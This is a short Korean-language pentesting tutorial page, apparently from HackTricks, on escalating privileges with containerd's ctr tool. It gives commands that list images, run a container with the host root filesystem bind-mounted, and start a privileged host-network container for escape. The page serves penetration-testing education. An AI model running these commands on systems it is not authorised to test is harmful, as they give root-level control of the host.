# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

다음 링크를 방문하여 **containerd가 무엇인지** 및 `ctr`에 대해 알아보세요:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

호스트에 `ctr` 명령이 포함되어 있는 경우:
```bash
which ctr
/usr/bin/ctr
```
이미지를 나열할 수 있습니다:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
그런 다음 **호스트 루트 폴더를 마운트하여 해당 이미지 중 하나를 실행합니다**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

특권이 있는 컨테이너를 실행하고 그로부터 탈출합니다.\
특권이 있는 컨테이너는 다음과 같이 실행할 수 있습니다:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
그런 다음 다음 페이지에 언급된 몇 가지 기술을 사용하여 **특권 기능을 악용하여 탈출할 수 있습니다**:

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
